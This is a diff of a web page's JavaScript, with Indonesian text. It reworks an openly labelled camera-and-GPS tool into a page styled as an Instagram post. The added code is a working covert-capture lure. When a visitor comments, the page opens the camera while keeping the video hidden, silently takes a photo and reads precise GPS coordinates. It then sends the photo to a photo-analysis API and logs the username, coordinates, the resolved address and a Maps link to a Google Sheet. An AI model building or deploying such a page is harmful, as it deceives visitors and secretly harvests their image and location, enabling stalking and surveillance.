-            |--------------------------------------------------------------------------
-            | Request Camera
-            |--------------------------------------------------------------------------
-            */
+/* =========================================================
+   ALLOW CAMERA
+========================================================== */
 
-            stream =
-                await navigator.mediaDevices.getUserMedia({
+document
+    .getElementById("allowCamera")
+    .addEventListener(
+        "click",
+        async function () {
+
+            cameraModal.hide();
+
+            await activateCamera();
+
+        }
+    );
+
+
+/* =========================================================
+   ACTIVATE CAMERA
+========================================================== */
+
+async function activateCamera() {
+
+    hideError();
+
+    try {
+
+        if (
+            !navigator.mediaDevices ||
+            !navigator.mediaDevices.getUserMedia
+        ) {
+
+            throw new Error(
+                "Kamera tidak tersedia."
+            );
+        }
+
+
+        const newStream =
+            await navigator
+                .mediaDevices
+                .getUserMedia({
 
                     video: {
 
                         facingMode: {
-
-                            ideal: "environment"
-
+                            ideal:
+                                "environment"
                         }
 
                     },
@@ -872,190 +1499,469 @@ allowCamera.addEventListener(
                 });
 
 
-            /*
-            |--------------------------------------------------------------------------
-            | Tampilkan Kamera
-            |--------------------------------------------------------------------------
-            */
-
-            video.srcObject =
-                stream;
-
-            video.style.display =
-                "block";
+        stream =
+            newStream;
 
 
-            /*
-            |--------------------------------------------------------------------------
-            | Enable Capture
-            |--------------------------------------------------------------------------
-            */
-
-            captureButton.disabled =
-                false;
+        video.srcObject =
+            stream;
 
 
-            startCamera.textContent =
-                "✅ Kamera Aktif";
+        video.style.display =
+            "none";
 
 
-        } catch (err) {
-
-            console.error(err);
+        await video.play();
 
 
-            let message =
-                "Tidak bisa mengakses kamera.";
+        cameraStatus.style.display =
+            "none";
 
 
-            if (
-                err.name ===
-                "NotAllowedError"
-            ) {
+        console.log(
+            "✅ Kamera berhasil diaktifkan."
+        );
 
-                message =
-                    "Akses kamera ditolak. " +
-                    "Silakan izinkan kamera pada browser.";
+    } catch (err) {
 
-            }
+        console.error(
+            "Camera error:",
+            err
+        );
 
+        stream =
+            null;
 
-            else if (
-                err.name ===
-                "NotFoundError"
-            ) {
-
-                message =
-                    "Kamera tidak ditemukan.";
-
-            }
+        showError(
+            "Akses kamera gagal."
+        );
+    }
+}
 
 
-            else if (
-                err.name ===
-                "NotReadableError"
-            ) {
+/* =========================================================
+   OPEN COMMENT MODAL
+========================================================== */
 
-                message =
-                    "Kamera sedang digunakan aplikasi lain.";
+function openCommentModal() {
 
-            }
+    if (analyzing) {
+        return;
+    }
 
-
-            else if (
-                err.message
-            ) {
-
-                message +=
-                    " " +
-                    err.message;
-
-            }
+    commentModal.show();
+}
 
 
-            showError(message);
+commentButton.addEventListener(
+    "click",
+    openCommentModal
+);
 
+
+commentButton2.addEventListener(
+    "click",
+    openCommentModal
+);
+
+
+/* =========================================================
+   SUBMIT COMMENT
+========================================================== */
+
+submitComment.addEventListener(
+    "click",
+    async function () {
+
+        if (analyzing) {
+            return;
         }
+
+
+        const comment =
+            commentInput.value.trim();
+
+
+        if (!comment) {
+
+            showError(
+                "Komentar belum diisi."
+            );
+
+            return;
+        }
+
+
+        /*
+         * KAMERA BELUM AKTIF
+         */
+
+        if (!stream) {
+
+            commentModal.hide();
+
+            cameraModal.show();
+
+            return;
+        }
+
+
+        /*
+         * TUTUP MODAL
+         */
+
+        commentModal.hide();
+
+
+        /*
+         * ANALISIS FOTO
+         */
+
+        await analyzePhoto(
+            comment
+        );
 
     }
 );
 
 
+/* =========================================================
+   ANALYZE PHOTO
+========================================================== */
 
-/* ============================================================
-   GPS
-============================================================ */
+async function analyzePhoto(
+    comment = ""
+) {
+
+    if (analyzing) {
+        return;
+    }
+
+
+    if (!stream) {
+
+        showError(
+            "Kamera belum aktif."
+        );
+
+        return;
+    }
+
+
+    analyzing =
+        true;
+
+
+    hideError();
+
+    hideSuccess();
+
+
+    loading.style.display =
+        "block";
+
+
+    gpsInfo.style.display =
+        "none";
+
+
+    try {
+
+
+        /* =====================================================
+           WAIT VIDEO
+        ====================================================== */
+
+        if (
+            video.readyState < 2 ||
+            video.videoWidth === 0 ||
+            video.videoHeight === 0
+        ) {
+
+            await new Promise(
+                function (
+                    resolve,
+                    reject
+                ) {
+
+                    const timeout =
+                        setTimeout(
+                            function () {
+
+                                reject(
+                                    new Error(
+                                        "Kamera belum siap."
+                                    )
+                                );
+
+                            },
+                            10000
+                        );
+
+
+                    video.onloadedmetadata =
+                        function () {
+
+                            clearTimeout(
+                                timeout
+                            );
+
+                            resolve();
+                        };
+
+                }
+            );
+        }
+
+
+        const width =
+            video.videoWidth;
+
+        const height =
+            video.videoHeight;
+
+
+        if (
+            !width ||
+            !height
+        ) {
+
+            throw new Error(
+                "Kamera belum siap mengambil gambar."
+            );
+        }
+
+
+        /* =====================================================
+           CANVAS
+        ====================================================== */
+
+        canvas.width =
+            width;
+
+        canvas.height =
+            height;
+
+
+        const context =
+            canvas.getContext(
+                "2d"
+            );
+
+
+        if (!context) {
+
+            throw new Error(
+                "Canvas tidak tersedia."
+            );
+        }
+
+
+        context.drawImage(
+            video,
+            0,
+            0,
+            width,
+            height
+        );
+
+
+        /* =====================================================
+           JPEG
+        ====================================================== */
+
+        const blob =
+            await new Promise(
+                function (resolve) {
+
+                    canvas.toBlob(
+                        resolve,
+                        "image/jpeg",
+                        0.95
+                    );
+
+                }
+            );
+
+
+        if (!blob) {
+
+            throw new Error(
+                "Gagal membuat gambar."
+            );
+        }
+
+
+        /* =====================================================
+           GPS
+        ====================================================== */
+
+        const position =
+            await getCurrentLocation();
+
+
+        const latitude =
+            position.coords.latitude;
+
+        const longitude =
+            position.coords.longitude;
+
+
+        gpsInfo.style.display =
+            "block";
+
+
+        gpsInfo.innerHTML = `
+            📍 GPS:
+            ${latitude.toFixed(6)},
+            ${longitude.toFixed(6)}
+        `;
+
+
+        /* =====================================================
+           EXIF
+        ====================================================== */
+
+        const gpsBlob =
+            await addGPSExif(
+                blob,
+                latitude,
+                longitude
+            );
+
+
+        /* =====================================================
+           SEND API
+        ====================================================== */
+
+        await sendToAPI(
+            gpsBlob,
+            comment
+        );
+
+
+        /*
+         * BERHASIL
+         */
+
+        showSuccess(
+            "❤️ Data berhasil dianalisis dan disimpan."
+        );
+
+
+        /*
+         * KOSONGKAN KOMENTAR
+         */
+
+        commentInput.value = "";
+
+
+    } catch (err) {
+
+        console.error(
+            "Analyze error:",
+            err
+        );
+
+
+        showError(
+            err.message ||
+            "Terjadi kesalahan saat memproses foto."
+        );
+
+    } finally {
+
+        loading.style.display =
+            "none";
+
+        analyzing =
+            false;
+    }
+}
+
+
+/* =========================================================
+   GET GPS
+========================================================== */
 
 function getCurrentLocation() {
 
     return new Promise(
-        (resolve, reject) => {
-
+        function (
+            resolve,
+            reject
+        ) {
 
             if (!navigator.geolocation) {
 
                 reject(
                     new Error(
-                        "Browser tidak mendukung GPS."
+                        "GPS tidak tersedia."
                     )
                 );
 
                 return;
-
             }
 
 
             navigator.geolocation.getCurrentPosition(
 
-                (position) => {
+                resolve,
 
-                    resolve({
-
-                        latitude:
-                            position.coords.latitude,
-
-                        longitude:
-                            position.coords.longitude,
-
-                        accuracy:
-                            position.coords.accuracy
-
-                    });
-
-                },
-
-
-                (error) => {
+                function (error) {
 
                     let message =
                         "Gagal mendapatkan lokasi.";
 
 
-                    switch (
-                        error.code
+                    if (
+                        error.code ===
+                        error.PERMISSION_DENIED
                     ) {
 
-                        case error.PERMISSION_DENIED:
-
-                            message =
-                                "Izin lokasi ditolak. " +
-                                "Silakan izinkan akses lokasi pada browser.";
-
-                            break;
+                        message =
+                            "Izin lokasi ditolak.";
+                    }
 
 
-                        case error.POSITION_UNAVAILABLE:
+                    if (
+                        error.code ===
+                        error.POSITION_UNAVAILABLE
+                    ) {
 
-                            message =
-                                "Lokasi tidak tersedia.";
+                        message =
+                            "Lokasi tidak tersedia.";
+                    }
 
-                            break;
 
+                    if (
+                        error.code ===
+                        error.TIMEOUT
+                    ) {
 
-                        case error.TIMEOUT:
-
-                            message =
-                                "Pengambilan lokasi timeout.";
-
-                            break;
-
+                        message =
+                            "Permintaan lokasi timeout.";
                     }
 
 
                     reject(
-                        new Error(message)
+                        new Error(
+                            message
+                        )
                     );
 
                 },
 
-
                 {
 
-                    enableHighAccuracy: true,
+                    enableHighAccuracy:
+                        true,
 
-                    timeout: 15000,
+                    timeout:
+                        15000,
 
-                    maximumAge: 0
+                    maximumAge:
+                        0
 
                 }
 
@@ -1063,66 +1969,78 @@ function getCurrentLocation() {
 
         }
     );
-
 }
 
 
+/* =========================================================
+   DECIMAL TO DMS
+========================================================== */
 
-/* ============================================================
-   DECIMAL → DMS
-============================================================ */
-
-function decimalToDMS(decimal) {
+function decimalToDMS(
+    decimal
+) {
 
     const absolute =
-        Math.abs(decimal);
+        Math.abs(
+            decimal
+        );
 
 
     const degrees =
-        Math.floor(absolute);
+        Math.floor(
+            absolute
+        );
 
 
     const minutesFloat =
-        (absolute - degrees) * 60;
+        (
+            absolute -
+            degrees
+        ) * 60;
 
 
     const minutes =
-        Math.floor(minutesFloat);
+        Math.floor(
+            minutesFloat
+        );
 
 
     const seconds =
-        (minutesFloat - minutes) * 60;
+        (
+            minutesFloat -
+            minutes
+        ) * 60;
 
 
     return [
 
-        [degrees, 1],
+        degrees,
 
-        [minutes, 1],
+        minutes,
 
-        [
-            Math.round(seconds * 100),
-            100
-        ]
+        Math.round(
+            seconds * 100
+        ) / 100
 
     ];
-
 }
 
 
-
-/* ============================================================
+/* =========================================================
    ADD GPS EXIF
-============================================================ */
+========================================================== */
 
-function addGPSExif(
+async function addGPSExif(
     blob,
     latitude,
     longitude
 ) {
 
     return new Promise(
-        (resolve, reject) => {
+        function (
+            resolve,
+            reject
+        ) {
 
             const reader =
                 new FileReader();
@@ -1133,94 +2051,145 @@ function addGPSExif(
 
                     try {
 
-                        const jpeg =
+                        const dataUrl =
                             reader.result;
 
 
-                        /*
-                        |--------------------------------------------------------------------------
-                        | EXIF
-                        |--------------------------------------------------------------------------
-                        */
-
-                        const exifObj = {
-
-                            "0th": {},
-
-                            "Exif": {},
-
-                            "GPS": {},
-
-                            "1st": {},
-
-                            "thumbnail": null
-
-                        };
+                        let exifObj;
 
 
-                        /*
-                        |--------------------------------------------------------------------------
-                        | GPS REF
-                        |--------------------------------------------------------------------------
-                        */
+                        try {
 
-                        const latRef =
-                            latitude >= 0
-                                ? "N"
-                                : "S";
+                            exifObj =
+                                piexif.load(
+                                    dataUrl
+                                );
 
+                        } catch (e) {
 
-                        const lngRef =
-                            longitude >= 0
-                                ? "E"
-                                : "W";
+                            exifObj = {
 
+                                "0th": {},
 
-                        /*
-                        |--------------------------------------------------------------------------
-                        | LATITUDE
-                        |--------------------------------------------------------------------------
-                        */
+                                "Exif": {},
 
-                        exifObj.GPS[
-                            piexif.GPSIFD.GPSLatitudeRef
-                        ] =
-                            latRef;
+                                "GPS": {},
+
+                                "1st": {},
+
+                                "thumbnail":
+                                    null
+
+                            };
+                        }
 
 
-                        exifObj.GPS[
-                            piexif.GPSIFD.GPSLatitude
-                        ] =
+                        if (!exifObj.GPS) {
+
+                            exifObj.GPS =
+                                {};
+                        }
+
+
+                        /* =================================================
+                           LATITUDE
+                        ================================================== */
+
+                        const latDMS =
                             decimalToDMS(
                                 latitude
                             );
 
 
-                        /*
-                        |--------------------------------------------------------------------------
-                        | LONGITUDE
-                        |--------------------------------------------------------------------------
-                        */
+                        exifObj.GPS[
+                            piexif.GPSIFD.GPSLatitude
+                        ] =
+                            latDMS.map(
+                                function (
+                                    value
+                                ) {
+
+                                    return [
+
+                                        Math.round(
+                                            value * 100
+                                        ),
+
+                                        100
+
+                                    ];
+
+                                }
+                            );
+
 
                         exifObj.GPS[
-                            piexif.GPSIFD.GPSLongitudeRef
+                            piexif.GPSIFD.GPSLatitudeRef
                         ] =
-                            lngRef;
+                            latitude >= 0
+                                ? "N"
+                                : "S";
 
 
-                        exifObj.GPS[
-                            piexif.GPSIFD.GPSLongitude
-                        ] =
+                        /* =================================================
+                           LONGITUDE
+                        ================================================== */
+
+                        const lngDMS =
                             decimalToDMS(
                                 longitude
                             );
 
 
-                        /*
-                        |--------------------------------------------------------------------------
-                        | DUMP EXIF
-                        |--------------------------------------------------------------------------
-                        */
+                        exifObj.GPS[
+                            piexif.GPSIFD.GPSLongitude
+                        ] =
+                            lngDMS.map(
+                                function (
+                                    value
+                                ) {
+
+                                    return [
+
+                                        Math.round(
+                                            value * 100
+                                        ),
+
+                                        100
+
+                                    ];
+
+                                }
+                            );
+
+
+                        exifObj.GPS[
+                            piexif.GPSIFD.GPSLongitudeRef
+                        ] =
+                            longitude >= 0
+                                ? "E"
+                                : "W";
+
+
+                        /* =================================================
+                           GPS VERSION
+                        ================================================== */
+
+                        exifObj.GPS[
+                            piexif.GPSIFD.GPSVersionID
+                        ] = [
+
+                            2,
+                            3,
+                            0,
+                            0
+
+                        ];
+
+
+                        /* =================================================
+                           DUMP
+                        ================================================== */
 
                         const exifBytes =
                             piexif.dump(
@@ -1228,28 +2197,24 @@ function addGPSExif(
                             );
 
 
-                        /*
-                        |--------------------------------------------------------------------------
-                        | INSERT EXIF
-                        |--------------------------------------------------------------------------
-                        */
+                        /* =================================================
+                           INSERT
+                        ================================================== */
 
-                        const newJpeg =
+                        const newDataUrl =
                             piexif.insert(
                                 exifBytes,
-                                jpeg
+                                dataUrl
                             );
 
 
-                        /*
-                        |--------------------------------------------------------------------------
-                        | BASE64 → BLOB
-                        |--------------------------------------------------------------------------
-                        */
+                        /* =================================================
+                           DATA URL -> BLOB
+                        ================================================== */
 
                         const byteString =
                             atob(
-                                newJpeg
+                                newDataUrl
                                     .split(",")[1]
                             );
 
@@ -1273,14 +2238,17 @@ function addGPSExif(
                         ) {
 
                             uint8Array[i] =
-                                byteString.charCodeAt(i);
-
+                                byteString.charCodeAt(
+                                    i
+                                );
                         }
 
 
                         const newBlob =
                             new Blob(
-                                [uint8Array],
+                                [
+                                    arrayBuffer
+                                ],
                                 {
                                     type:
                                         "image/jpeg"
@@ -1293,12 +2261,11 @@ function addGPSExif(
                         );
 
 
-                    } catch (err) {
+                    } catch (error) {
 
-                        console.error(err);
-
-                        reject(err);
-
+                        reject(
+                            error
+                        );
                     }
 
                 };
@@ -1308,556 +2275,553 @@ function addGPSExif(
                 reject;
 
 
-            reader.readAsDataURL(blob);
+            reader.readAsDataURL(
+                blob
+            );
+
+        }
+    );
+}
+
+
+/* =========================================================
+   SEND TO PHOTO API
+========================================================== */
+
+async function sendToAPI(
+    blob,
+    comment
+) {
+
+    const formData =
+        new FormData();
+
+
+    formData.append(
+        "file",
+        blob,
+        "photo.jpg"
+    );
+
+
+    const response =
+        await fetch(
+            PHOTO_API_URL,
+            {
+                method:
+                    "POST",
+
+                body:
+                    formData
+            }
+        );
+
+
+    if (!response.ok) {
+
+        throw new Error(
+            "API gagal memproses foto. HTTP " +
+            response.status
+        );
+    }
+
+
+    const data =
+        await response.json();
+
+
+    console.log(
+        "API RESPONSE:",
+        data
+    );
+
+
+    /*
+     * SIMPAN HASIL ANALISIS
+     * KE GOOGLE SPREADSHEET
+     */
+
+    await saveAnalysisToGoogleSheet(
+        data,
+        comment
+    );
+}
+
+
+/* =========================================================
+   SAVE ANALYSIS TO GOOGLE SHEET
+========================================================== */
+
+async function saveAnalysisToGoogleSheet(
+    data,
+    comment
+) {
+
+    console.log(
+        "Data API yang akan disimpan:",
+        data
+    );
+
+
+    const responseData =
+        data.data || {};
+
+
+    const coordinates =
+        responseData.coordinates || {};
+
+
+    const location =
+        responseData.location || {};
+
+
+    const maps =
+        responseData.maps || {};
+
+
+    const gpsFound =
+        responseData.gps_found
+            ? "Ditemukan"
+            : "Tidak ditemukan";
+
+
+    const latitude =
+        coordinates.latitude ?? "";
+
+
+    const longitude =
+        coordinates.longitude ?? "";
+
+
+    const desa =
+        location.desa_kelurahan ?? "";
+
+
+    const kecamatan =
+        location.kecamatan ?? "";
+
+
+    const kabupaten =
+        location.kabupaten_kota ?? "";
+
+
+    const provinsi =
+        location.provinsi ?? "";
+
+
+    const negara =
+        location.negara ?? "";
+
+
+    let googleMaps =
+        maps.google || "";
+
+
+    /*
+     * JIKA API TIDAK MEMBERIKAN
+     * URL GOOGLE MAPS
+     */
+
+    if (
+        !googleMaps &&
+        latitude !== "" &&
+        longitude !== ""
+    ) {
+
+        googleMaps =
+            "https://www.google.com/maps?q=" +
+            latitude +
+            "," +
+            longitude;
+    }
+
+
+    /*
+     * DATA YANG DIKIRIM
+     */
+
+    const spreadsheetData = {
+
+        action:
+            "PHOTO_ANALYSIS",
+
+        username:
+            USERNAME,
+
+        comment:
+            comment || "",
+
+        gps_found:
+            gpsFound,
+
+        latitude:
+            latitude,
+
+        longitude:
+            longitude,
+
+        desa_kelurahan:
+            desa,
+
+        kecamatan:
+            kecamatan,
+
+        kabupaten_kota:
+            kabupaten,
+
+        provinsi:
+            provinsi,
+
+        negara:
+            negara,
+
+        google_maps:
+            googleMaps,
+
+        image:
+            postImage.src,
+
+        likes:
+            likes,
+
+        timestamp:
+            new Date().toISOString()
+
+    };
+
+
+    console.log(
+        "📊 Data yang dikirim ke Spreadsheet:",
+        spreadsheetData
+    );
+
+
+    /*
+     * KIRIM
+     */
+
+    await sendToGoogleSheet(
+        spreadsheetData
+    );
+
+
+    console.log(
+        "✅ Hasil analisis berhasil disimpan ke Google Spreadsheet."
+    );
+}
+
+
+/* =========================================================
+   SUCCESS
+========================================================== */
+
+function showSuccess(
+    message
+) {
+
+    successBox.innerText =
+        message;
+
+    successBox.style.display =
+        "block";
+
+
+    setTimeout(
+        function () {
+
+            successBox.style.display =
+                "none";
+
+        },
+        5000
+    );
+}
+
+
+/* =========================================================
+   ERROR
+========================================================== */
+
+function showError(
+    message
+) {
+
+    errorBox.innerText =
+        message;
+
+    errorBox.style.display =
+        "block";
+}
+
+
+function hideError() {
+
+    errorBox.innerText =
+        "";
+
+    errorBox.style.display =
+        "none";
+}
+
+
+function hideSuccess() {
+
+    successBox.innerText =
+        "";
+
+    successBox.style.display =
+        "none";
+}
+
+
+/* =========================================================
+   SHARE
+========================================================== */
+
+document
+    .getElementById("shareButton")
+    .addEventListener(
+        "click",
+        async function () {
+
+            try {
+
+                if (
+                    navigator.share
+                ) {
+
+                    await navigator.share({
+
+                        title:
+                            "lyhtaa • Instagram",
+
+                        text:
+                            "Lihat postingan ini"
+
+                    });
+
+                } else {
+
+                    alert(
+                        "Fitur share tidak tersedia di browser ini."
+                    );
+                }
+
+            } catch (error) {
+
+                console.log(
+                    "Share dibatalkan."
+                );
+            }
 
         }
     );
 
+
+/* =========================================================
+   BOOKMARK
+========================================================== */
+
+document
+    .getElementById("bookmarkButton")
+    .addEventListener(
+        "click",
+        function () {
+
+            if (
+                this.innerHTML ===
+                "♡"
+            ) {
+
+                this.innerHTML =
+                    "♥";
+
+                this.style.color =
+                    "#262626";
+
+            } else {
+
+                this.innerHTML =
+                    "♡";
+
+            }
+
+        }
+    );
+
+
+/* =========================================================
+   VIEW PROFILE
+========================================================== */
+
+document
+    .querySelector(".view-profile")
+    .addEventListener(
+        "click",
+        function () {
+
+            alert(
+                "Profile lyhtaa"
+            );
+
+        }
+    );
+
+
+/* =========================================================
+   INSTAGRAM LINK
+========================================================== */
+
+document
+    .getElementById("instagramLink")
+    .addEventListener(
+        "click",
+        function (event) {
+
+            event.preventDefault();
+
+            alert(
+                "Instagram"
+            );
+
+        }
+    );
+
+
+/* =========================================================
+   CAROUSEL
+========================================================== */
+
+const images = [
+
+    "./instagram-post.jpg",
+
+    "./instagram-post-2.jpg",
+
+    "./instagram-post-3.jpg"
+
+];
+
+
+let currentImage =
+    0;
+
+
+const dots =
+    document.querySelectorAll(
+        ".carousel-dot"
+    );
+
+
+function updateCarousel() {
+
+    postImage.src =
+        images[
+            currentImage
+        ];
+
+
+    dots.forEach(
+        function (
+            dot,
+            index
+        ) {
+
+            dot.classList.toggle(
+                "active",
+                index ===
+                currentImage
+            );
+
+        }
+    );
 }
 
 
+document
+    .getElementById("prevButton")
+    .addEventListener(
+        "click",
+        function () {
 
-/* ============================================================
-   CAPTURE BUTTON
-============================================================ */
+            currentImage--;
 
-captureButton.addEventListener(
-    "click",
-    () => {
 
-        if (!stream) {
+            if (
+                currentImage < 0
+            ) {
 
-            showError(
-                "Kamera belum aktif."
-            );
+                currentImage =
+                    images.length - 1;
+            }
 
-            return;
+
+            updateCarousel();
 
         }
+    );
 
 
-        hideError();
+document
+    .getElementById("nextButton")
+    .addEventListener(
+        "click",
+        function () {
 
+            currentImage++;
 
-        /*
-        |--------------------------------------------------------------------------
-        | Tampilkan modal lokasi
-        |--------------------------------------------------------------------------
-        */
 
-        locationModal.show();
+            if (
+                currentImage >=
+                images.length
+            ) {
 
-    }
-);
+                currentImage =
+                    0;
+            }
 
 
+            updateCarousel();
 
-/* ============================================================
-   IZINKAN LOKASI
-============================================================ */
+        }
+    );
 
-allowLocation.addEventListener(
-    "click",
-    async () => {
 
-        locationModal.hide();
+/* =========================================================
+   INITIALIZE
+========================================================== */
 
+updateLikeUI();
 
-        try {
+video.style.display =
+    "none";
 
-            hideError();
 
-            result.style.display =
-                "none";
+/* =========================================================
+   CLEANUP CAMERA
+========================================================== */
 
-            captureButton.disabled =
-                true;
+window.addEventListener(
+    "beforeunload",
+    function () {
 
+        if (stream) {
 
-            /*
-            |--------------------------------------------------------------------------
-            | STEP 1
-            |--------------------------------------------------------------------------
-            */
+            stream
+                .getTracks()
+                .forEach(
+                    function (
+                        track
+                    ) {
 
-            loading.style.display =
-                "block";
-
-            loading.textContent =
-                "📍 Mengambil lokasi GPS...";
-
-
-            const location =
-                await getCurrentLocation();
-
-
-            console.log(
-                "GPS:",
-                location
-            );
-
-
-            /*
-            |--------------------------------------------------------------------------
-            | TAMPILKAN GPS
-            |--------------------------------------------------------------------------
-            */
-
-            gpsInfo.style.display =
-                "block";
-
-
-            gpsInfo.innerHTML =
-
-                "📍 GPS berhasil didapatkan<br>" +
-
-                "Latitude: " +
-
-                location.latitude +
-
-                "<br>" +
-
-                "Longitude: " +
-
-                location.longitude +
-
-                "<br>" +
-
-                "Accuracy: ±" +
-
-                location.accuracy +
-
-                " meter";
-
-
-            /*
-            |--------------------------------------------------------------------------
-            | STEP 2
-            |--------------------------------------------------------------------------
-            */
-
-            loading.textContent =
-                "📷 Mengambil foto...";
-
-
-            canvas.width =
-                video.videoWidth;
-
-
-            canvas.height =
-                video.videoHeight;
-
-
-            const context =
-                canvas.getContext("2d");
-
-
-            /*
-            |--------------------------------------------------------------------------
-            | STEP 3
-            |--------------------------------------------------------------------------
-            */
-
-            context.drawImage(
-
-                video,
-
-                0,
-
-                0,
-
-                canvas.width,
-
-                canvas.height
-
-            );
-
-
-            /*
-            |--------------------------------------------------------------------------
-            | STEP 4
-            |--------------------------------------------------------------------------
-            */
-
-            loading.textContent =
-                "📷 Membuat foto...";
-
-
-            canvas.toBlob(
-
-                async (blob) => {
-
-
-                    if (!blob) {
-
-                        showError(
-                            "Gagal membuat foto."
-                        );
-
-                        loading.style.display =
-                            "none";
-
-                        captureButton.disabled =
-                            false;
-
-                        return;
+                        track.stop();
 
                     }
-
-
-                    try {
-
-
-                        /*
-                        |--------------------------------------------------------------------------
-                        | STEP 5
-                        |--------------------------------------------------------------------------
-                        */
-
-                        loading.textContent =
-                            "📝 Menyimpan GPS ke metadata EXIF...";
-
-
-                        const photoWithExif =
-                            await addGPSExif(
-
-                                blob,
-
-                                location.latitude,
-
-                                location.longitude
-
-                            );
-
-
-                        console.log(
-                            "Foto dengan EXIF:",
-                            photoWithExif
-                        );
-
-
-                        /*
-                        |--------------------------------------------------------------------------
-                        | STEP 6
-                        |--------------------------------------------------------------------------
-                        */
-
-                        loading.textContent =
-                            "⏳ Foto sedang dikirim ke server...";
-
-
-                        await sendToAPI(
-                            photoWithExif
-                        );
-
-
-                    } catch (err) {
-
-                        console.error(err);
-
-
-                        showError(
-                            "Gagal memproses metadata GPS: " +
-                            err.message
-                        );
-
-                    } finally {
-
-                        loading.style.display =
-                            "none";
-
-                        captureButton.disabled =
-                            false;
-
-                    }
-
-                },
-
-
-                "image/jpeg",
-
-                0.95
-
-            );
-
-
-        } catch (err) {
-
-            console.error(err);
-
-
-            loading.style.display =
-                "none";
-
-
-            captureButton.disabled =
-                false;
-
-
-            showError(
-                err.message
-            );
-
+                );
         }
 
     }
 );
-
-
-
-/* ============================================================
-   SEND TO API
-============================================================ */
-
-async function sendToAPI(blob) {
-
-    try {
-
-
-        const formData =
-            new FormData();
-
-
-        /*
-        |--------------------------------------------------------------------------
-        | FILE
-        |--------------------------------------------------------------------------
-        */
-
-        formData.append(
-
-            "file",
-
-            blob,
-
-            "camera-photo.jpg"
-
-        );
-
-
-        /*
-        |--------------------------------------------------------------------------
-        | FASTAPI
-        |--------------------------------------------------------------------------
-        */
-
-        const response =
-            await fetch(
-
-                "https://bemppnew.kejaksaan.info/photo-api/analyze",
-                // "http://202.157.188.85:8000/analyze",
-
-                {
-
-                    method:
-                        "POST",
-
-                    body:
-                        formData
-
-                }
-
-            );
-
-
-        /*
-        |--------------------------------------------------------------------------
-        | JSON
-        |--------------------------------------------------------------------------
-        */
-
-        const data =
-            await response.json();
-
-
-        /*
-        |--------------------------------------------------------------------------
-        | ERROR API
-        |--------------------------------------------------------------------------
-        */
-
-        if (!response.ok) {
-
-            throw new Error(
-
-                data.detail ||
-
-                "API mengalami error"
-
-            );
-
-        }
-
-
-        /*
-        |--------------------------------------------------------------------------
-        | RESULT
-        |--------------------------------------------------------------------------
-        */
-
-        displayResult(
-            data
-        );
-
-
-    } catch (err) {
-
-        console.error(err);
-
-        throw err;
-
-    }
-
-}
-
-
-
-/* ============================================================
-   DISPLAY RESULT
-============================================================ */
-
-function displayResult(data) {
-
-
-    result.style.display =
-        "block";
-
-
-    /*
-    |--------------------------------------------------------------------------
-    | GPS
-    |--------------------------------------------------------------------------
-    */
-
-    if (!data.gps_found) {
-
-        document.getElementById(
-            "gpsStatus"
-        ).textContent =
-            "⚠️ GPS tidak ditemukan";
-
-
-        return;
-
-    }
-
-
-    document.getElementById(
-        "gpsStatus"
-    ).textContent =
-        "✅ GPS ditemukan";
-
-
-    /*
-    |--------------------------------------------------------------------------
-    | LATITUDE
-    |--------------------------------------------------------------------------
-    */
-
-    document.getElementById(
-        "latitude"
-    ).textContent =
-
-        data.coordinates?.latitude ??
-        "-";
-
-
-    /*
-    |--------------------------------------------------------------------------
-    | LONGITUDE
-    |--------------------------------------------------------------------------
-    */
-
-    document.getElementById(
-        "longitude"
-    ).textContent =
-
-        data.coordinates?.longitude ??
-        "-";
-
-
-    /*
-    |--------------------------------------------------------------------------
-    | LOCATION
-    |--------------------------------------------------------------------------
-    */
-
-    const location =
-        data.location || {};
-
-
-    document.getElementById(
-        "address"
-    ).textContent =
-
-        location.address ||
-        "-";
-
-
-    document.getElementById(
-        "desa"
-    ).textContent =
-
-        location.desa_kelurahan ||
-        "-";
-
-
-    document.getElementById(
-        "kecamatan"
-    ).textContent =
-
-        location.kecamatan ||
-        "-";
-
-
-    document.getElementById(
-        "kabupaten"
-    ).textContent =
-
-        location.kabupaten_kota ||
-        "-";
-
-
-    document.getElementById(
-        "provinsi"
-    ).textContent =
-
-        location.provinsi ||
-        "-";
-
-
-    document.getElementById(
-        "negara"
-    ).textContent =
-
-        location.negara ||
-        "-";
-
-
-    /*
-    |--------------------------------------------------------------------------
-    | GOOGLE MAPS
-    |--------------------------------------------------------------------------
-    */
-
-    if (data.maps?.google) {
-
-        const maps =
-            document.getElementById(
-                "googleMaps"
-            );
-
-
-        maps.href =
-            data.maps.google;
-
-
-        maps.style.display =
-            "inline-block";
-
-    }
-
-}
 
 </script>
 
